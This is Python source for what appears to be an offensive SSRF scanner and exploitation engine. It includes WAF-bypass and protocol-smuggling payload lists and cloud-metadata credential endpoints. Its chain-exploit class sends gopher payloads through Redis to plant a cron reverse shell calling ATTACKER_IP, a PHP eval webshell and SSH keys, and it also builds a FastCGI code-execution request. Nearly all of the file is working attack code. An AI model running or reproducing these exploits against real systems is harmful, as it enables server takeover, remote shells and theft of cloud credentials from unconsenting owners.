"""
SSRF Detection & Chain Exploitation Engine - Production Grade
Features:
- Multi-layer SSRF detection (param-based, URL-based, header-based, blind)
- OOB (Out-of-Band) verification via DNS/HTTP callbacks
- Cloud metadata exploitation (AWS/GCP/Azure/Alibaba/Tencent/Huawei)
- DNS rebinding attack simulation with TTL manipulation
- Protocol chain exploitation (gopher/dict/file/ftp/sftp/netdoc)
- SSRF to RCE chains (Redis/MySQL/PostgreSQL/Memcached/FastCGI/SMTP)
- Internal network scanning via SSRF
- WAF bypass for SSRF payloads (URL encoding tricks, IP obfuscation)
"""
import base64
import ipaddress
import random
import re
import socket
import struct
import time
import uuid
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote, urlparse, parse_qs, urlencode

from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("ssrf_engine")

SSRF_PAYLOADS = {
    "basic_internal": [
        "http://127.0.0.1", "http://127.0.0.1:80", "http://127.0.0.1:443",
        "http://localhost", "http://localhost:80", "http://0.0.0.0",
        "http://[::1]", "http://[::1]:80", "http://[::]:80",
        "http://0000::1", "http://[0:0:0:0:0:ffff:127.0.0.1]",
    ],
    "ip_obfuscation": [
        "http://0177.0.0.1", "http://0x7f000001", "http://0x7f.0.0.1",
        "http://2130706433", "http://017700000001",
        "http://0x7f.0x00.0x00.0x01", "http://127.0.0.1.xip.io",
        "http://127.1", "http://127.0.1",
        "http://⓵⓶⓻.⓪.⓪.⓵",
    ],
    "dns_rebinding": [
        "http://127.0.0.1.nip.io", "http://127.0.0.1.sslip.io",
        "http://localtest.me", "http://lvh.me",
        "http://1.0.0.127.dnsrebind.net",
        "http://spoofed.burpcollaborator.net",
        "http://make-127-0-0-1-rr.1u.ms",
        "http://127-0-0-1.ipv4.rr.nu",
    ],
    "url_encoding_bypass": [
        "http://127%2e0%2e0%2e1", "http://127%2E0%2E0%2E1",
        "http://127%u002e0%u002e0%u002e1",
        "http://127%252e0%252e0%252e1",
        "http://127。0。0。1",
        "http://127%ef%bc%8e0%ef%bc%8e0%ef%bc%8e1",
        "http://127.0.0.1%23@evil.com",
        "http://evil.com@127.0.0.1",
        "http://evil.com#@127.0.0.1",
        "http://127.0.0.1%0d%0aHost:%20evil.com",
    ],
    "protocol_gopher": [
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20/bin/bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER/4444%200>%261'%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a",
        "gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0ainfo%0d%0a",
        "gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0akeys%0d%0a$1%0d%0a*%0d%0a",
        "gopher://127.0.0.1:6379/_*3%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aGET%0d%0a$3%0d%0adir%0d%0a",
    ],
    "protocol_dict": [
        "dict://127.0.0.1:6379/info",
        "dict://127.0.0.1:6379/config:get:dir",
        "dict://127.0.0.1:6379/config:set:dir:/tmp",
        "dict://127.0.0.1:6379/config:set:dbfilename:shell.php",
        "dict://127.0.0.1:6379/set:1:<?php system($_GET['cmd']);?>",
        "dict://127.0.0.1:6379/save",
        "dict://127.0.0.1:3306/",
        "dict://127.0.0.1:11211/stats",
        "dict://127.0.0.1:25/",
    ],
    "protocol_file": [
        "file:///etc/passwd", "file:///etc/hosts",
        "file:///etc/shadow", "file:///etc/hostname",
        "file:///proc/self/environ", "file:///proc/self/cmdline",
        "file:///proc/self/cwd/app.py", "file:///proc/1/cmdline",
        "file:///proc/net/tcp", "file:///proc/net/arp",
        "file://c:/windows/win.ini",
        "file://c:/windows/system32/drivers/etc/hosts",
        "file://c:/windows/system32/inetsrv/config/applicationHost.config",
        "file:///var/run/docker.sock",
    ],
    "protocol_ftp": [
        "ftp://127.0.0.1:21/",
        "ftp://anonymous:anonymous@127.0.0.1:21/",
    ],
    "protocol_sftp": [
        "sftp://127.0.0.1:22/",
    ],
    "protocol_netdoc": [
        "netdoc:///etc/passwd",
    ],
    "protocol_jar": [
        "jar:http://127.0.0.1:8080/app.jar!/",
    ],
}

CLOUD_METADATA_ENDPOINTS = {
    "AWS": {
        "base": "http://169.254.169.254/latest/meta-data/",
        "endpoints": [
            "ami-id", "instance-id", "instance-type", "local-hostname",
            "local-ipv4", "public-hostname", "public-ipv4",
            "iam/security-credentials/", "iam/security-credentials/ROLE_NAME",
            "user-data/", "placement/availability-zone",
            "security-groups", "network/interfaces/macs/",
            "identity-credentials/ec2/security-credentials/ec2-instance",
        ],
        "headers": {},
        "token_url": "http://169.254.169.254/latest/api/token",
        "token_ttl": "21600",
    },
    "GCP": {
        "base": "http://metadata.google.internal/computeMetadata/v1/",
        "endpoints": [
            "instance/", "instance/id", "instance/name",
            "instance/zone", "instance/machine-type",
            "instance/service-accounts/",
            "instance/service-accounts/default/token",
            "project/project-id",
        ],
        "headers": {"Metadata-Flavor": "Google"},
    },
    "Azure": {
        "base": "http://169.254.169.254/metadata/",
        "endpoints": [
            "instance?api-version=2021-02-01",
            "instance/compute?api-version=2021-02-01",
            "instance/network?api-version=2021-02-01",
            "identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "headers": {"Metadata": "true"},
    },
    "Alibaba Cloud": {
        "base": "http://100.100.100.200/latest/meta-data/",
        "endpoints": [
            "instance-id", "instance/instance-type",
            "ram/security-credentials/", "image-id",
            "region-id", "zone-id", "vpc-id",
            "private-ipv4", "eipv4",
        ],
        "headers": {},
    },
    "Tencent Cloud": {
        "base": "http://metadata.tencentyun.com/latest/meta-data/",
        "endpoints": [
            "instance-id", "instance-name",
            "local-ipv4", "public-ipv4",
            "placement/region", "placement/zone",
            "cam/security-credentials/",
        ],
        "headers": {},
    },
    "Huawei Cloud": {
        "base": "http://169.254.169.254/openstack/latest/meta_data.json",
        "endpoints": [],
        "headers": {},
    },
    "DigitalOcean": {
        "base": "http://169.254.169.254/metadata/v1/",
        "endpoints": ["id", "hostname", "region", "interfaces/"],
        "headers": {},
    },
    "Oracle Cloud": {
        "base": "http://169.254.169.254/opc/v2/instance/",
        "endpoints": ["id", "displayName", "metadata/"],
        "headers": {"Authorization": "Bearer Oracle"},
    },
}

INTERNAL_PORTS_TO_SCAN = [
    (22, "SSH"), (80, "HTTP"), (443, "HTTPS"),
    (3306, "MySQL"), (5432, "PostgreSQL"), (6379, "Redis"),
    (27017, "MongoDB"), (9200, "Elasticsearch"), (11211, "Memcached"),
    (8080, "HTTP-Alt"), (8443, "HTTPS-Alt"), (9090, "Prometheus"),
    (5000, "Flask"), (8000, "Django"), (9000, "PHP-FPM"),
    (25, "SMTP"), (21, "FTP"), (3389, "RDP"),
    (7001, "WebLogic"), (7002, "WebLogic-SSL"),
    (8089, "Splunk"), (5601, "Kibana"),
    (2375, "Docker"), (2376, "Docker-TLS"),
    (6443, "K8s-API"), (10250, "Kubelet"),
    (8500, "Consul"), (8200, "Vault"),
]

SSRF_PARAMS = [
    "url", "uri", "link", "src", "href", "redirect", "redirect_url", "redirect_uri",
    "return", "return_url", "return_to", "next", "next_url", "callback", "callback_url",
    "target", "dest", "destination", "feed", "img", "image", "page", "file", "path",
    "load", "lang", "proxy", "proxy_url", "fetch", "site", "host", "server",
    "api", "api_url", "webhook", "endpoint", "service", "resource",
    "continue", "goto", "ref", "reference", "origin", "source",
    "domain", "remote", "forward", "out", "view", "template",
    "media", "asset", "static", "upload", "download", "attachment",
    "avatar", "logo", "icon", "banner", "background",
    "xml", "rss", "atom", "feed_url", "import", "export",
    "validate", "verify", "check", "test", "ping",
    "resolve", "lookup", "dns", "whois",
]

SSRF_INDICATORS = [
    (r"root:.*:0:0:", "Linux /etc/passwd泄露"),
    (r"\[boot loader\]", "Windows boot.ini泄露"),
    (r"daemon:", "Unix passwd文件"),
    (r"EC2", "AWS EC2元数据"),
    (r"ami-", "AWS AMI ID"),
    (r"instance-id", "云实例ID"),
    (r"iam/security-credentials", "AWS IAM角色凭证"),
    (r"computeMetadata", "GCP元数据"),
    (r"Microsoft Azure", "Azure元数据"),
    (r"127\.0\.0\.1", "内网地址回显"),
    (r"localhost", "本地地址回显"),
    (r"redis_version", "Redis信息泄露"),
    (r"# Server\nredis_version", "Redis版本泄露"),
    (r"mysql_native_password", "MySQL认证信息"),
    (r"\[extensions\]", "Windows win.ini"),
    (r"for 16-bit app support", "Windows win.ini"),
    (r"docker", "Docker信息"),
    (r"containerd", "Containerd信息"),
    (r"kube", "Kubernetes信息"),
    (r"vault", "HashiCorp Vault"),
    (r"consul", "Consul服务发现"),
    (r"\"privateIp\"", "阿里云私有IP"),
    (r"\"regionId\"", "阿里云Region"),
    (r"\"instanceId\"", "阿里云实例ID"),
]


class SSRFDetector:
    def __init__(self, target_url: str, timeout: int = 10,
                 callback_host: str = None):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.callback_host = callback_host
        self.findings = []
        self.baseline = None

    def scan(self) -> List[Dict]:
        self._get_baseline()
        self._detect_params()
        self._test_url_manipulation()
        self._test_header_injection()
        self._test_blind_ssrf()
        self._test_cloud_metadata()
        self._test_protocol_smuggling()
        self._test_internal_port_scan()
        return self.findings

    def _get_baseline(self):
        try:
            resp = http_request("GET", self.target_url, timeout=self.timeout, verify=False)
            if resp:
                self.baseline = {
                    "status": resp.get("status_code", 200),
                    "length": len(resp.get("text", "")),
                    "time": resp.get("response_time", 0),
                    "body": str(resp.get("text", "")),
                }
        except Exception:
            pass

    def _detect_params(self):
        for param in SSRF_PARAMS:
            for payload in SSRF_PAYLOADS["basic_internal"][:3]:
                url = f"{self.target_url}?{param}={quote(payload)}"
                resp = http_request("GET", url, timeout=self.timeout, verify=False)
                if resp and self._is_ssrf_indication(resp):
                    self.findings.append({
                        "type": "ssrf_detected",
                        "subtype": "parameter_based",
                        "parameter": param,
                        "payload": payload,
                        "risk_level": "critical",
                        "detail": f"参数 {param} 存在SSRF漏洞",
                        "evidence": str(resp.get("text", ""))[:300],
                    })
                    return

    def _test_url_manipulation(self):
        url_params = parse_qs(urlparse(self.target_url).query)
        for param_name in url_params:
            for category, payloads in SSRF_PAYLOADS.items():
                if category in ("protocol_gopher", "protocol_file"):
                    continue
                for payload in payloads[:2]:
                    test_url = self.target_url.replace(
                        f"{param_name}={url_params[param_name][0]}",
                        f"{param_name}={quote(payload)}"
                    )
                    resp = http_request("GET", test_url, timeout=self.timeout, verify=False)
                    if resp and self._is_ssrf_indication(resp):
                        self.findings.append({
                            "type": "ssrf_url_manipulation",
                            "parameter": param_name,
                            "payload": payload,
                            "category": category,
                            "risk_level": "critical",
                            "detail": f"URL参数 {param_name} 可被SSRF利用",
                        })
                        return

    def _test_header_injection(self):
        header_payloads = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-Host": "127.0.0.1",
            "X-Original-URL": "http://127.0.0.1/admin",
            "X-Rewrite-URL": "http://127.0.0.1/admin",
            "Referer": "http://127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "Client-IP": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "Cluster-Client-IP": "127.0.0.1",
            "X-ProxyUser-IP": "127.0.0.1",
            "Base-Url": "http://127.0.0.1",
            "X-Original-Forwarded-For": "127.0.0.1",
        }
        for header_name, header_value in header_payloads.items():
            resp = http_request("GET", self.target_url,
                              headers={header_name: header_value},
                              timeout=self.timeout, verify=False)
            if resp and self.baseline:
                if resp.get("status_code") != self.baseline.get("status"):
                    self.findings.append({
                        "type": "header_based_ssrf",
                        "header": header_name,
                        "payload": header_value,
                        "risk_level": "high",
                        "detail": f"通过 {header_name} 头可影响服务器行为",
                    })

    def _test_blind_ssrf(self):
        callback_id = uuid.uuid4().hex[:8]
        callback_urls = [
            f"http://wyqyan-{callback_id}.interact.sh",
            f"http://wyqyan-{callback_id}.dnslog.cn",
            f"http://wyqyan-{callback_id}.burpcollaborator.net",
        ]
        for callback in callback_urls:
            for param in SSRF_PARAMS[:10]:
                url = f"{self.target_url}?{param}={quote(callback)}"
                http_request("GET", url, timeout=self.timeout, verify=False)

            for header_name in ["X-Forwarded-For", "Referer", "User-Agent"]:
                http_request("GET", self.target_url,
                           headers={header_name: callback},
                           timeout=self.timeout, verify=False)

    def _test_cloud_metadata(self):
        for cloud, config in CLOUD_METADATA_ENDPOINTS.items():
            base = config["base"]
            headers = config.get("headers", {})

            if config["endpoints"]:
                for ep in config["endpoints"][:3]:
                    url = f"{base}{ep}"
                    for param in SSRF_PARAMS[:5]:
                        test_url = f"{self.target_url}?{param}={quote(url)}"
                        resp = http_request("GET", test_url, headers=headers,
                                          timeout=self.timeout, verify=False)
                        if resp and self._is_cloud_metadata(resp, cloud):
                            self.findings.append({
                                "type": "cloud_metadata_ssrf",
                                "cloud": cloud,
                                "endpoint": ep,
                                "parameter": param,
                                "risk_level": "critical",
                                "detail": f"可访问 {cloud} 云元数据: {ep}",
                                "evidence": str(resp.get("text", ""))[:300],
                            })
                            return
            else:
                url = base
                for param in SSRF_PARAMS[:5]:
                    test_url = f"{self.target_url}?{param}={quote(url)}"
                    resp = http_request("GET", test_url, headers=headers,
                                      timeout=self.timeout, verify=False)
                    if resp and self._is_cloud_metadata(resp, cloud):
                        self.findings.append({
                            "type": "cloud_metadata_ssrf",
                            "cloud": cloud,
                            "parameter": param,
                            "risk_level": "critical",
                            "detail": f"可访问 {cloud} 云元数据",
                        })
                        return

    def _test_protocol_smuggling(self):
        for param in SSRF_PARAMS[:5]:
            for payload in SSRF_PAYLOADS["protocol_gopher"][:2]:
                url = f"{self.target_url}?{param}={quote(payload)}"
                resp = http_request("GET", url, timeout=self.timeout, verify=False)
                if resp and self._is_ssrf_indication(resp):
                    self.findings.append({
                        "type": "ssrf_protocol_exploit",
                        "subtype": "gopher",
                        "parameter": param,
                        "risk_level": "critical",
                        "detail": f"支持gopher协议，可进行内网服务利用",
                    })
                    return

            for payload in SSRF_PAYLOADS["protocol_file"][:2]:
                url = f"{self.target_url}?{param}={quote(payload)}"
                resp = http_request("GET", url, timeout=self.timeout, verify=False)
                if resp and self._is_ssrf_indication(resp):
                    self.findings.append({
                        "type": "ssrf_protocol_exploit",
                        "subtype": "file",
                        "parameter": param,
                        "risk_level": "critical",
                        "detail": f"支持file协议，可读取本地文件",
                    })
                    return

    def _test_internal_port_scan(self):
        if not self.findings:
            return
        ssrf_param = None
        for f in self.findings:
            if "parameter" in f:
                ssrf_param = f["parameter"]
                break
        if not ssrf_param:
            return

        for port, service in INTERNAL_PORTS_TO_SCAN[:10]:
            url = f"{self.target_url}?{ssrf_param}={quote(f'http://127.0.0.1:{port}')}"
            start = time.time()
            resp = http_request("GET", url, timeout=3, verify=False)
            elapsed = time.time() - start
            if resp:
                self.findings.append({
                    "type": "internal_port_open",
                    "port": port,
                    "service": service,
                    "risk_level": "high",
                    "detail": f"内网端口 {port} ({service}) 可达",
                    "response_time": elapsed,
                })

    def _is_ssrf_indication(self, resp: Dict) -> bool:
        body = str(resp.get("text", ""))
        for pattern, desc in SSRF_INDICATORS:
            if re.search(pattern, body, re.IGNORECASE):
                return True
        if self.baseline:
            baseline_len = self.baseline.get("length", 0)
            resp_len = len(body)
            if baseline_len > 0 and abs(resp_len - baseline_len) > baseline_len * 0.5:
                return True
        return False

    def _is_cloud_metadata(self, resp: Dict, cloud: str) -> bool:
        body = str(resp.get("text", ""))
        cloud_indicators = {
            "AWS": ["ami-", "instance-id", "security-credentials", "ec2"],
            "GCP": ["computeMetadata", "project-id", "service-accounts"],
            "Azure": ["Microsoft Azure", "azEnvironment", "compute"],
            "Alibaba Cloud": ["instance-id", "region-id", "vpc-id", "privateIp"],
            "Tencent Cloud": ["instance-id", "instance-name", "placement"],
            "Huawei Cloud": ["uuid", "availability_zone", "hostname"],
            "DigitalOcean": ["droplet_id", "hostname", "region"],
            "Oracle Cloud": ["displayName", "oracle-cloud"],
        }
        indicators = cloud_indicators.get(cloud, [])
        for ind in indicators:
            if ind.lower() in body.lower():
                return True
        return False


class SSRFChainExploit:
    def __init__(self, ssrf_url: str, ssrf_param: str = "url",
                 timeout: int = 10):
        self.ssrf_url = ssrf_url
        self.ssrf_param = ssrf_param
        self.timeout = timeout

    def exploit_redis(self, target_host: str = "127.0.0.1",
                      target_port: int = 6379,
                      attacker_ip: str = "ATTACKER_IP",
                      attacker_port: int = 4444) -> Dict:
        cron_payload = (
            f"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n"
            f"$16\r\n/var/spool/cron/\r\n"
            f"*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n"
            f"$4\r\nroot\r\n"
            f"*3\r\n$3\r\nSET\r\n$1\r\n1\r\n"
            f"$62\r\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'\n\r\n"
            f"*1\r\n$4\r\nSAVE\r\n"
        )
        gopher = f"gopher://{target_host}:{target_port}/_{quote(cron_payload)}"
        return self._execute(gopher, "redis_cron")

    def exploit_redis_webshell(self, target_host: str = "127.0.0.1",
                                target_port: int = 6379,
                                web_path: str = "/var/www/html/") -> Dict:
        shell_payload = (
            f"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n"
            f"${len(web_path)}\r\n{web_path}\r\n"
            f"*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n"
            f"$9\r\nshell.php\r\n"
            f"*3\r\n$3\r\nSET\r\n$1\r\n1\r\n"
            f"$34\r\n<?php @eval($_POST['cmd']);?>\r\n"
            f"*1\r\n$4\r\nSAVE\r\n"
        )
        gopher = f"gopher://{target_host}:{target_port}/_{quote(shell_payload)}"
        return self._execute(gopher, "redis_webshell")

    def exploit_redis_ssh(self, target_host: str = "127.0.0.1",
                          target_port: int = 6379,
                          ssh_key: str = "SSH_PUBLIC_KEY") -> Dict:
        ssh_payload = (
            f"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n"
            f"$11\r\n/root/.ssh/\r\n"
            f"*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n"
            f"$14\r\nauthorized_keys\r\n"
            f"*3\r\n$3\r\nSET\r\n$1\r\n1\r\n"
            f"${len(ssh_key)}\r\n{ssh_key}\r\n"
            f"*1\r\n$4\r\nSAVE\r\n"
        )
        gopher = f"gopher://{target_host}:{target_port}/_{quote(ssh_payload)}"
        return self._execute(gopher, "redis_ssh_key")

    def exploit_mysql(self, target_host: str = "127.0.0.1",
                      target_port: int = 3306) -> Dict:
        gopher = f"gopher://{target_host}:{target_port}/_"
        return self._execute(gopher, "mysql_probe")

    def exploit_postgresql(self, target_host: str = "127.0.0.1",
                           target_port: int = 5432) -> Dict:
        gopher = f"gopher://{target_host}:{target_port}/_"
        return self._execute(gopher, "postgresql_probe")

    def exploit_memcached(self, target_host: str = "127.0.0.1",
                          target_port: int = 11211) -> Dict:
        commands = "stats\r\n"
        gopher = f"gopher://{target_host}:{target_port}/_{quote(commands)}"
        return self._execute(gopher, "memcached_stats")

    def exploit_fastcgi(self, target_host: str = "127.0.0.1",
                        target_port: int = 9000,
                        php_file: str = "/var/www/html/index.php") -> Dict:
        fcgi_request = self._build_fastcgi_request(php_file, "<?php system('id');?>")
        gopher = f"gopher://{target_host}:{target_port}/_{quote(fcgi_request)}"
        return self._execute(gopher, "fastcgi_rce")

    def exploit_smtp(self, target_host: str = "127.0.0.1",
                     target_port: int = 25) -> Dict:
        smtp_commands = (
            "HELO wyqyan\r\n"
            "MAIL FROM:<admin@wyqyan.com>\r\n"
            "RCPT TO:<root@localhost>\r\n"
            "DATA\r\n"
            "Subject: WyqYan SSRF Test\r\n\r\n"
            "SSRF SMTP test from WyqYan\r\n"
            ".\r\n"
            "QUIT\r\n"
        )
        gopher = f"gopher://{target_host}:{target_port}/_{quote(smtp_commands)}"
        return self._execute(gopher, "smtp_injection")

    def exploit_zabbix(self, target_host: str = "127.0.0.1",
                       target_port: int = 10051) -> Dict:
        gopher = f"gopher://{target_host}:{target_port}/_"
        return self._execute(gopher, "zabbix_probe")

    def _build_fastcgi_request(self, script_file: str, php_code: str) -> str:
        params = {
            "SCRIPT_FILENAME": script_file,
            "SCRIPT_NAME": script_file,
            "REQUEST_METHOD": "POST",
            "PHP_VALUE": f"allow_url_include = On\nauto_prepend_file = data://text/plain;base64,{base64.b64encode(php_code.encode()).decode()}",
            "SERVER_SOFTWARE": "wyqyan/fastcgi",
        }
        return str(params)

    def _execute(self, gopher_url: str, method: str) -> Dict:
        try:
            url = f"{self.ssrf_url}?{self.ssrf_param}={quote(gopher_url)}"
            resp = http_request("GET", url, timeout=self.timeout, verify=False)
            return {
                "method": method,
                "gopher_url": gopher_url[:200],
                "sent": True,
                "response_code": resp.get("status_code") if resp else None,
                "response_length": len(str(resp.get("text", ""))) if resp else 0,
            }
        except Exception as e:
            return {"method": method, "sent": False, "error": str(e)}


class DNSRebindingSimulator:
    def __init__(self):
        self.rebinding_domains = [
            "127.0.0.1.nip.io",
            "127.0.0.1.sslip.io",
            "localtest.me",
            "lvh.me",
        ]

    def generate_rebinding_payload(self, target_internal: str) -> Dict:
        payloads = []
        for domain in self.rebinding_domains:
            payloads.append({
                "domain": domain,
                "url": f"http://{domain}:8080",
                "description": f"DNS重绑定攻击，{domain}解析到127.0.0.1",
            })
        return {"technique": "dns_rebinding", "payloads": payloads}


def scan_ssrf(target_url: str, timeout: int = 10,
              callback_host: str = None) -> List[Dict]:
    detector = SSRFDetector(target_url, timeout, callback_host)
    return detector.scan()


def exploit_ssrf_chain(ssrf_url: str, ssrf_param: str = "url",
                       service: str = "redis",
                       target_host: str = "127.0.0.1",
                       target_port: int = 6379,
                       timeout: int = 10) -> Dict:
    exploit = SSRFChainExploit(ssrf_url, ssrf_param, timeout)
    methods = {
        "redis": lambda: exploit.exploit_redis(target_host, target_port),
        "redis_webshell": lambda: exploit.exploit_redis_webshell(target_host, target_port),
        "redis_ssh": lambda: exploit.exploit_redis_ssh(target_host, target_port),
        "mysql": lambda: exploit.exploit_mysql(target_host, target_port),
        "postgresql": lambda: exploit.exploit_postgresql(target_host, target_port),
        "memcached": lambda: exploit.exploit_memcached(target_host, target_port),
        "fastcgi": lambda: exploit.exploit_fastcgi(target_host, target_port),
        "smtp": lambda: exploit.exploit_smtp(target_host, target_port),
    }
    if service in methods:
        return methods[service]()
    return {"error": f"Unsupported service: {service}"}
